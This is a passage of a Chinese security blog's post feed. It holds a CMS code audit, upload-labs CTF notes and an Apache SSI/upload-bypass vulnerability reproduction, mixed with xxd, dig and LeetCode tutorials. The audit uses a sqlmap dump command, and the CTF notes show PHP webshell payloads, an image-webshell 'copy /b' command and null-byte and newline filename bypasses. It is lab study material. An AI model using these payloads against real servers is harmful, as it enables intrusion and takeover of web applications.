src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><pre><code class="php">    global $global;    $global = array();    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);    if($global[&#39;url&#39;] != &#39;&#39;)    {        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符        $global[&#39;channel&#39;] = $arr[1];        var_dump($global);</code></pre><p><img src="/posts/728b20a1/1580564015011.png" alt></p><pre><code class="php">function main(){    global $global,$smarty;    set_global();    include_all(&#39;admin/class&#39;);    set_more_global();    $path = &#39;admin/admin.php&#39;;    if($global[&#39;url&#39;] != &#39;&#39;)    {        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控        var_dump(file_exists($path2));        if(file_exists($path2))        {            $path = $path2;        }    }    include($path);}</code></pre><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><pre><code class="php">function run($parameter){    global $smarty;    $path = &#39;&#39;;    $display = &#39;&#39;;    extract($parameter); //extract函数存在变量覆盖，但是参数不可控    $func = &#39;module_&#39;.$module;    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);    $func($parameter);    if($display != &#39;no&#39;)    {        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);    }}</code></pre><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>校验了后缀名</p><pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>相关的白名单</p><pre><code class="php">    $config = array(        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB    );</code></pre><p>之后会读取文件</p><pre><code class="php">readfile( $imgUrl,false,$context);</code></pre><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20 monster.jpg00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</code></pre><p>通过 -g 变为一个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 monster.jpg 00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</code></pre><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf57f48</code></pre><p>​    可以输出C语言数组形式</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg unsigned char monster_jpg[] = {  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48};unsigned int monster_jpg_len = 32;</code></pre><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><pre><code class="bash"># pxy @ LAPTOP-UBIEP4K5$ xxd monster.jpg file.dump# pxy @ LAPTOP-UBIEP4K5$ head -n 4 file.dump 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.&#39;# pxy @ LAPTOP-UBIEP4K5 $ xxd -r file.dump &gt; a.jpg# pxy @ LAPTOP-UBIEP4K5 $ file a.jpg a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</code></pre><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可（<strong>漏洞影响版本：PHP 5.4.38~5.6.6</strong>）</p><blockquote><p>move_uploaded_file ( string $filename , string ​$destination )</p></blockquote><p> 这次的漏洞就出现在参数$destination,这个参数的是将用户上传的文件移动到最终的目的地址。如果$destionation变量是从用户$_GET或者$_POST中获取的并且我们可控，那么我们就可以利用空字符\00来截断后面的拓展名，从而造成任意文件上传</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>这题原来是有bug的，不过现在修改了</p><p>原来的代码：</p><p><img src="/posts/5877398d/20180829084054-2fdf5136-ab24-1.png" alt></p><p>可以很明显的看到，就算不是gif图片，也能够上传。</p><p><a href="https://xz.aliyun.com/t/2657#toc-0" target="_blank" rel="noopener">参考</a>这篇文章，这题涉及到了二次渲染的绕过问题</p><p>文章中给出的图片：<a href="https://github.com/Yang1k/upload-labs-Pass16" target="_blank" rel="noopener">链接</a></p><p>这样，在上传之后才能够保证二次渲染之后还是有马</p><p><img src="/posts/5877398d/11.gif" alt></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><code>exif_imagetype</code> 检测是否为图片</p><p>制作图片马，然后上传即可</p><pre><code>copy normal.jpg /b + shell.php /a webshell.jpg</code></pre><pre><code class="php">function isImage($filename){    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) {        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    }}</code></pre><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>上传图片马即可</p><pre><code class="php">function isImage($filename){    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}</code></pre><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>判断了文件头，上传图片马即可</p><pre><code class="php">function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}</code></pre><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>利用 <code>CVE-2015-2348</code> ， <code>move_uploaded_file</code> 函数遇到00会截断</p><pre><code class="php">if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }</code></pre><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><code>move_uploaded_file</code> 遇到00会截断</p><pre><code class="php">if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.99.100:8080/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>环境中处理文件上传的代码:</p><pre><code class="php">&lt;?phpif(isset($_FILES[&#39;file&#39;])) {    $name = basename($_POST[&#39;name&#39;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {        exit(&#39;bad file&#39;);    }    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);</code></pre><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><pre><code class="php">$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];var_dump($uploaded_name);</code></pre><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &#39;&#39;        nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]        chars = [&#39;M&#39;,&#39;CM&#39;,&#39;D&#39;,&#39;CD&#39;,&#39;C&#39;,&#39;XC&#39;,&#39;L&#39;,&#39;XL&#39;,&#39;X&#39;,&#39;IX&#39;,&#39;V&#39;,&#39;IV&#39;,&#39;I&#39;]        for i in nums:            x = num // i            num = num % i            result += x*chars[nums.index(i)]        return result</code></pre><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &quot;&quot;        roman = {1000:&#39;M&#39;,900:&#39;CM&#39;, 500:&#39;D&#39;, 400:&#39;CD&#39;, 100:&#39;C&#39;,90:&#39;XC&#39;, 50:&#39;L&#39;, 40: &#39;XL&#39;,10:&#39;X&#39;,9:&#39;IX&#39;, 5:&#39;V&#39;,4:&#39;IV&#39;, 1:&#39;I&#39;}        for i in roman:            x = num // i            num = num % i            result += x*roman[i]        return result</code></pre><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><pre><code class="python">d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}</code></pre><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><pre><code class="python">class Solution:    def romanToInt(self, s: str) -&gt; int:        d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}        result = 0        for i,n in enumerate(s):            a = max(i-1,0)            b = d.get(s[a:i+1], d[n]) # 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]            result += b        return result</code></pre><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><pre><code class="python">return sum(d.get(s[max(i-1, 0):i+1], d[n]) for i, n in enumerate(s))</code></pre><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><pre><code>;; QUESTION SECTION:;prontosil.club.                        IN      CNAME;; ANSWER SECTION:prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.;; Query time: 55 msec</code></pre><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><pre><code>;; ANSWER SECTION:_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0=.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl/Rhg0=&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
